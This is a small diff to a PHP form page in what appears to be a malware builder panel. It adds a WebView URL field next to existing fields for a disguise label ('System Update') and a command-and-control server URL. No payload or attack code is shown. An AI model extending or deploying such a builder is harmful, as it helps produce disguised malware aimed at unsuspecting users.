@@ -83,6 +83,10 @@ require_once __DIR__ . '/../database.php';
                     <input type="text" id="appLabel" value="System Update">
                 </div>
                 <div class="form-group">
+                    <label>WebView URL</label>
+                    <input type="text" id="webviewUrl" value="https://google.com">
+                </div>
+                <div class="form-group">
                     <label>C2 URL</label>
                     <input type="text" id="c2Url" value="http://<?php echo $_SERVER['HTTP_HOST']; ?>/c2/">
                 </div>
